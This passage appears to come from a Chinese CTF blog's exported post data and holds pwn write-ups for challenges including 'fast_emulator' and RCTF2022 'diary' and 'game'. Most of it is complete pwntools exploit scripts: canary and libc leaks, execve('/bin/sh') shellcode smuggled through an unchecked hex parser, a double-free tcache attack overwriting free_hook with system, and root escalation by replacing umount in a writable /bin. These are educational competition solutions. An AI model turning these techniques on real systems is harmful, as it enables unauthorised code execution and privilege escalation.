punctuation">(</span>stack_addr<span class="token punctuation">)</span>edit<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'name : '</span><span class="token punctuation">)</span>canary <span class="token operator">=</span> u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span>lg<span class="token punctuation">(</span><span class="token string">'canary'</span><span class="token punctuation">,</span> canary<span class="token punctuation">)</span>payload <span class="token operator">=</span> b<span class="token string">'b'</span><span class="token operator">*</span><span class="token number">8</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x40155d</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> payload<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x38</span><span class="token punctuation">,</span> b<span class="token string">'b'</span><span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>canary<span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">4</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x401713</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span>b<span class="token string">'/bin/sh'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__next__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#gdb.attach(io, 'b *0x401416')</span><span class="token comment" spellcheck="true">#gdb.attach(io, 'b *0x40149d')</span>edit<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'>'</span><span class="token punctuation">,</span> <span class="token string">'0'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#gdb.attach(io)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h3 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h3><p>这题和南阳理工的师傅交流的过程中，发现他们因为找不到2.23对应的c++库，放弃了调试。如wp所示，我调试的过程中，是直接先用自己虚拟机的libc库怼成功了，然后直接改用给的2.23偏移打远程。这样暴力的方法有一个问题：就是不同libc库会导致environ栈地址和canary的偏移不同（stack_addr = leak_stack + 0x7fffaca833c8 - 0x7fffaca834d8这句），好在我远程的过程中试了几次就找到了2.23下的canary偏移，比较幸运</p><p>当然，时间充足的情况下，肯定是能找到所有对应库本地调试，最严谨。</p><h1 id="fast-emulator"><a href="#fast-emulator" class="headerlink" title="fast_emulator"></a>fast_emulator</h1><h3 id="题目复现-1"><a href="#题目复现-1" class="headerlink" title="题目复现"></a>题目复现</h3><p>程序实现了一个能实现load,add,sub,mul,div,xor指令的即时编译器，用户逐行输入指令， parse_line会把指令分析为args结构体，然后args结构体会被翻译为shellcode，全部输入后执行shellcode</p><p><img src="2.png" alt="main process"></p><h3 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>说说我解题时的过程（基本是废话）</p><p>我先把所有指令试了一遍，然后动调发现div指令实际的shellcode是loopne，我就考虑用loopne直接跳转到load的数据造成恶意执行。比如有一句’load r1, 0x12345678’，直接跳转到\x12\x34\x56\x78的地方</p><p>然后我想让跳转执行的命令更长，就试了一下’load r1,0x1111111111’,然后动调发现，shellcode实际被翻译为’mov rax, 0x11111111’再加上\x11\x11</p><p>也就是说，<strong>这个mov rax,(num)最多只能支持32位数，但解析的过程中可以拼接超过32位的数，超过的部分会变成下一行汇编执行</strong></p><p>再静态分析，正是这个from_hex函数没有限制16进制数的大小</p><p><img src="3.png" alt="from_hex"></p><p>这样我们相当于可以直接用这个漏洞任意执行了，但还要注意，我们输入的每行指令有长度限制，因此网上扒的shellcode得分段</p><p>具体大小端之类的麻烦问题直接看我wp</p><h3 id="wp-1"><a href="#wp-1" class="headerlink" title="wp"></a>wp</h3><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span><span class="token keyword">def</span> <span class="token function">lg</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span>addr<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\033[1;31;40m%20s-->0x%x\033[0m'</span><span class="token operator">%</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span>addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#io = process('./pwn')</span>io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'172.31.3.108'</span><span class="token punctuation">,</span> <span class="token number">10000</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#gdb.attach(io, 'b*$rebase(0x1a16)')</span><span class="token comment" spellcheck="true">#gdb.attach(io, 'b*$rebase(0x16d5)')</span>payload <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>shellcode <span class="token operator">=</span> <span class="token string">'\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05'</span>payload<span class="token punctuation">.</span>append<span class="token punctuation">(</span>b<span class="token string">'load r2, 0x'</span> <span class="token operator">+</span> b<span class="token string">'f63148'</span> <span class="token operator">+</span> b<span class="token string">'0'</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span>payload<span class="token punctuation">.</span>append<span class="token punctuation">(</span>b<span class="token string">'load r2, 0x'</span> <span class="token operator">+</span> b<span class="token string">'68732f2f6e69622fbf4856'</span> <span class="token operator">+</span> b<span class="token string">'0'</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span>payload<span class="token punctuation">.</span>append<span class="token punctuation">(</span>b<span class="token string">'load r2, 0x'</span> <span class="token operator">+</span> b<span class="token string">'5f5457'</span> <span class="token operator">+</span> b<span class="token string">'0'</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span>payload<span class="token punctuation">.</span>append<span class="token punctuation">(</span>b<span class="token string">'load r2, 0x'</span> <span class="token operator">+</span> b<span class="token string">'050f99583b6a'</span> <span class="token operator">+</span> b<span class="token string">'0'</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span>length <span class="token operator">=</span> len<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'enter:'</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span>length<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>length<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'>'</span><span class="token punctuation">,</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> writeup </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>game非预期</title>
      <link href="/2022/12/16/game%E9%9D%9E%E9%A2%84%E6%9C%9F/"/>
      <url>/2022/12/16/game%E9%9D%9E%E9%A2%84%E6%9C%9F/</url>
      
        <content type="html"><![CDATA[<p>这次game盯了好久，结果大家都是非预期。特此来学习一下</p><p>我们的内核题大概是先在start.sh中启动qemu，然后启用文件系统里的init脚本</p><p><img src="1.png" alt="解压后的文件系统"></p><p><img src="2.png" alt="init脚本"></p><p>那么问题就在，如果我们原本的文件系统中bin文件夹没有设置root为所有者，而且init的脚本也没有设置相应的权限变动，<strong>最终题目呈现的结果就是做题者对bin文件夹拥有rwx权限，可以随便增删查改bin中的所有命令</strong></p><p>再看我们的init脚本</p><p>用1000的uid（即chal用户）执行完/bin/sh后，用root权限调用了umount,poweroff命令，如果我们把umount,poweroff任意一个换成/bin/sh，并结束当前的/bin/sh，就相当于root权限执行了/bin/sh实现了提权</p><p>不知道poweroff替换为啥失败了，还是用大家都用的替换umount试验一下</p><p><img src="3.png" alt="替换umount提权"></p><p>要避免这种非预期很简单，在init脚本中chown bin sbin这些文件夹给root，或者直接输命令chown它们就行了，不再赘述了</p>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> study </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RCTF2022diary</title>
      <link href="/2022/12/13/RCTF2022diary/"/>
      <url>/2022/12/13/RCTF2022diary/</url>
      
        <content type="html"><![CDATA[<p>这次RCTF本来准备给校队认真打的，结果写了一题我们学校突然说放假了，我就兴奋的没怎么看了。</p><p>就看了diary和game，以为game是签到题，结果是非预期我不知道。看来linux部署这块得好好学学。</p><p>要是跟着r3打就好了，我就能把精力放在那几道堆题上了（bushi）</p><p>看了一下大战队们的wp，解法好像跟我的完全不一样（比我的简单多了），就来分享一下。</p><h3 id="题目复现"><a href="#题目复现" class="headerlink" title="题目复现"></a>题目复现</h3><p>本质是个堆题，可以add,edit,delete，有意思的事还能encrypt,decrypt，其实我都没把题目逆完。</p><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>我代码也怎么仔细审，本来想fuzz的。后来自己随便试了试，在创建多个chunk后，如果我们删掉非最后一个的chunk就会导致一个double free的效果。</p><pre class=" language-python"><code class="language-python">sla<span class="token punctuation">(</span><span class="token string">'cmd:'</span><span class="token punctuation">,</span> <span class="token string">'add#1#2#3#4#5#6#'</span> <span class="token operator">+</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span>sla<span class="token punctuation">(</span><span class="token string">'cmd:'</span><span class="token punctuation">,</span> <span class="token string">'add#2#2#3#4#5#6#'</span> <span class="token operator">+</span> <span class="token string">'b'</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span>sla<span class="token punctuation">(</span><span class="token string">'cmd:'</span><span class="token punctuation">,</span> <span class="token string">'delete#0'</span><span class="token punctuation">)</span></code></pre><p><img src="1.png" alt="double free"></p><p>有这个double free我们就基本上随便打了吧，因为是0x311的堆块，libc和heap地址都有了</p><p>问题是由于每个堆块前4个字节都会被置为0x20，我们tcache attack就没那么方便了。</p><p>我瞄了眼nu1l的wp里提到了什么encrypt时候的calloc啥的，这块我都没看。我的想法是：<strong>有什么方法能让前4个字节，变成我们预期打的free_hook地址?</strong></p><p>试了下encrypt函数,可以对前四字节逐字节加密，这个加密是和一系列随机字节异或产生的。而且这个随机后的值我们也可以通过show拿到，<strong>那么我们只要逐字节不断爆破，获得预期字节，就能得到free_hook地址。</strong> 也不用把程序逆完了。</p><pre class=" language-python"><code class="language-python">i <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">while</span> i<span class="token operator">!=</span><span class="token number">4</span><span class="token punctuation">:</span>    <span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>        encrypt<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span> i<span class="token punctuation">)</span>        show<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>        ru<span class="token punctuation">(</span><span class="token string">'6\n'</span><span class="token punctuation">)</span>        r<span class="token punctuation">(</span>i<span class="token punctuation">)</span>        cur <span class="token operator">=</span> u8<span class="token punctuation">(</span>r<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>cur<span class="token operator">==</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            decrypt<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>            i <span class="token operator">=</span> <span class="token number">0</span>            <span class="token keyword">for</span> j <span class="token keyword">in</span> range<span class="token punctuation">(</span>random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                encrypt<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'another try'</span><span class="token punctuation">)</span>            <span class="token keyword">continue</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>cur<span class="token operator">==</span>bruce_byte<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'succuss brute'</span><span class="token punctuation">,</span>i<span class="token punctuation">)</span>            <span class="token comment" spellcheck="true">#gdb.attach(io)</span>            i<span class="token operator">+=</span><span class="token number">1</span>            <span class="token keyword">break</span></code></pre><h3 id="wp"><a href="#wp" class="headerlink" title="wp"></a>wp</h3><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">import</span> random<span class="token comment" spellcheck="true">#context.log_level = 'debug'</span>context<span class="token punctuation">.</span>arch <span class="token operator">=</span> <span class="token string">'amd64'</span>ru         <span class="token operator">=</span> <span class="token keyword">lambda</span> a<span class="token punctuation">:</span>     io<span class="token punctuation">.</span>readuntil<span class="token punctuation">(</span>a<span class="token punctuation">)</span>r         <span class="token operator">=</span> <span class="token keyword">lambda</span> n<span class="token punctuation">:</span>        io<span class="token punctuation">.</span>read<span class="token punctuation">(</span>n<span class="token punctuation">)</span>sla     <span class="token operator">=</span> <span class="token keyword">lambda</span> a<span class="token punctuation">,</span>b<span class="token punctuation">:</span>     io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>a<span class="token punctuation">,</span>b<span class="token punctuation">)</span>sa         <span class="token operator">=</span> <span class="token keyword">lambda</span> a<span class="token punctuation">,</span>b<span class="token punctuation">:</span>     io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>a<span class="token punctuation">,</span>b<span class="token punctuation">)</span>sl        <span class="token operator">=</span> <span class="token keyword">lambda</span> a<span class="token punctuation">:</span>     io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>a<span class="token punctuation">)</span>s         <span class="token operator">=</span> <span class="token keyword">lambda</span> a<span class="token punctuation">:</span>     io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">lg</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span>addr<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\033[1;31;40m%20s-->0x%x\033[0m'</span><span class="token operator">%</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span>addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#io = process('./pwn')</span>io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'119.13.105.35'</span><span class="token punctuation">,</span> <span class="token number">10111</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#elf = ELF('./pwn')</span><span class="token comment" spellcheck="true">#libc = ELF('/root/glibc-all-in-one/libs/2.31-0ubuntu9_amd64/libc.so.6')</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./libc-2.31.so'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>idx<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>    sa<span class="token punctuation">(</span><span class="token string">'cmd:'</span><span class="token punctuation">,</span><span class="token string">'add#'</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>idx<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'#2#3#4#5#6#'</span><span class="token punctuation">)</span>    sl<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>idx<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>    sa<span class="token punctuation">(</span><span class="token string">'cmd:'</span><span class="token punctuation">,</span><span class="token string">'update#'</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>idx<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'#'</span><span class="token punctuation">)</span>    sl<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>    sla<span class="token punctuation">(</span><span class="token string">'cmd:'</span><span class="token punctuation">,</span> <span class="token string">'show#'</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dele</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>    sla<span class="token punctuation">(</span><span class="token string">'cmd:'</span><span class="token punctuation">,</span> <span class="token string">'delete#'</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">encrypt</span><span class="token punctuation">(</span>idx<span class="token punctuation">,</span> offset<span class="token punctuation">)</span><span class="token punctuation">:</span>    sla<span class="token punctuation">(</span><span class="token string">'cmd:'</span><span class="token punctuation">,</span> <span class="token string">'encrypt#'</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>idx<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'#'</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>offset<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'#1'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">decrypt</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>    sla<span class="token punctuation">(</span><span class="token string">'cmd:'</span><span class="token punctuation">,</span> <span class="token string">'decrypt#'</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># leak heap</span>add<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">'1'</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">'2'</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span>dele<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token string">'3'</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token string">'4'</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token string">'5'</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span> <span class="token string">'6'</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span>dele<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>dele<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>ru<span class="token punctuation">(</span><span class="token string">'6\n'</span><span class="token punctuation">)</span>leak_heap <span class="token operator">=</span> u64<span class="token punctuation">(</span>r<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span>b<span class="token string">'\0'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>lg<span class="token punctuation">(</span><span class="token string">'leak_heap'</span><span class="token punctuation">,</span> leak_heap<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># leak libc</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    add<span class="token punctuation">(</span><span class="token number">16</span><span class="token operator">+</span>i<span class="token punctuation">,</span> str<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    dele<span class="token punctuation">(</span><span class="token number">10</span><span class="token operator">-</span>i<span class="token punctuation">)</span>dele<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>ru<span class="token punctuation">(</span><span class="token string">'6\n'</span><span class="token punctuation">)</span>leak_libc <span class="token operator">=</span> u64<span class="token punctuation">(</span>r<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span>b<span class="token string">'\0'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>lg<span class="token punctuation">(</span><span class="token string">'leak_libc'</span><span class="token punctuation">,</span> leak_libc<span class="token punctuation">)</span>libc_base <span class="token operator">=</span> leak_libc <span class="token operator">-</span> <span class="token punctuation">(</span><span class="token number">0x7f17465e4be0</span> <span class="token operator">-</span> <span class="token number">0x7f17463f8000</span><span class="token punctuation">)</span>lg<span class="token punctuation">(</span><span class="token string">'leak_base'</span><span class="token punctuation">,</span> libc_base<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#gdb.attach(io)</span><span class="token comment" spellcheck="true"># tcache attack</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    add<span class="token punctuation">(</span><span class="token number">32</span><span class="token operator">+</span>i<span class="token punctuation">,</span> str<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span>dele<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span>dele<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span>dele<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span>dele<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>target <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token number">0x7fc9ae630e48</span> <span class="token operator">-</span><span class="token number">0x7fc9ae442000</span><span class="token punctuation">)</span>  <span class="token operator">-</span><span class="token number">4</span><span class="token comment" spellcheck="true">#gdb.attach(io)</span>edit<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>target <span class="token operator">>></span> <span class="token number">32</span><span class="token punctuation">)</span> <span class="token operator">+</span> b<span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x300</span><span class="token punctuation">)</span>bruce_byte <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>bruce_byte<span class="token punctuation">.</span>append<span class="token punctuation">(</span>target <span class="token operator">&amp;</span> <span class="token number">0xff</span><span class="token punctuation">)</span>bruce_byte<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token punctuation">(</span>target <span class="token operator">>></span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span><span class="token punctuation">)</span>bruce_byte<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token punctuation">(</span>target <span class="token operator">>></span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span><span class="token punctuation">)</span>bruce_byte<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token punctuation">(</span>target <span class="token operator">>></span> <span class="token number">24</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>bruce_byte<span class="token punctuation">)</span>lg<span class="token punctuation">(</span><span class="token string">'target'</span><span class="token punctuation">,</span> target<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#pause()</span><span class="token comment" spellcheck="true">#gdb.attach(io, 'b*$rebase(0x30d5)')</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">while</span> i<span class="token operator">!=</span><span class="token number">4</span><span class="token punctuation">:</span>    <span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>        encrypt<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span> i<span class="token punctuation">)</span>        show<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>        ru<span class="token punctuation">(</span><span class="token string">'6\n'</span><span class="token punctuation">)</span>        r<span class="token punctuation">(</span>i<span class="token punctuation">)</span>        cur <span class="token operator">=</span> u8<span class="token punctuation">(</span>r<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>cur<span class="token operator">==</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            decrypt<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>            i <span class="token operator">=</span> <span class="token number">0</span>            <span class="token keyword">for</span> j <span class="token keyword">in</span> range<span class="token punctuation">(</span>random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                encrypt<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'another try'</span><span class="token punctuation">)</span>            <span class="token keyword">continue</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>cur<span class="token operator">==</span>bruce_byte<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'succuss brute'</span><span class="token punctuation">,</span>i<span class="token punctuation">)</span>            <span class="token comment" spellcheck="true">#gdb.attach(io)</span>            i<span class="token operator">+=</span><span class="token number">1</span>            <span class="token keyword">break</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'succuss rute'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">40</span><span class="token punctuation">,</span> b<span class="token string">'/bin/sh'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">41</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>dele<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span>dele<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span>bdele<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#gdb.attach(io)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h3 id="比赛总结"><a href="#比赛总结" class="headerlink" title="比赛总结"></a>比赛总结</h3><p>其实这题我纯纯瞎猫碰死耗子写的，题目也没审完。好久没认真打ctf感觉自己专注度，体力啥的下降很大，学校一堆屁事牵扯了很多精力，原来跟着r3打也都是别人找完洞自己偷鸡写个脚本。从今天开始要痛定思痛，加强时间管理，不能摆下去了。</p>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> writeup </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2022/04/14/hello-world/"/>
      <url>/2022/04/14/hello-world/</url>
      
